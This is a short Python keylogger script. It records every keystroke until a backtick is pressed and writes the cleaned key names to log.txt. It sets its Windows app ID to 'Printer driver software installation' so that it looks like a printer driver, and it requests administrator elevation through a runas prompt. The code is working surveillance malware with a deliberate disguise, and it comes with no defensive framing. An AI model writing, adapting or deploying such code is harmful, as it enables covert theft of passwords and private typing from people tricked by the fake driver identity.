import keyboard
import ctypes #Funny C in Py
import sys

output = open("log.txt", 'w')
appid = 'Printer driver software installation'
c = (ctypes.windll.shell32)

def start():
    r = keyboard.record(until='`')
    r = str(r)
    r = r.replace(',', '')
    r = r.replace("KeyboardEvent(", '')
    r = r.replace("down)", '')
    r = r.replace("up)", '')
    output.write(r)

if __name__ == "__main__":
    c.SetCurrentProcessExplicitAppUserModelID(appid)
    if not c.IsUserAnAdmin():
        c.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    start()
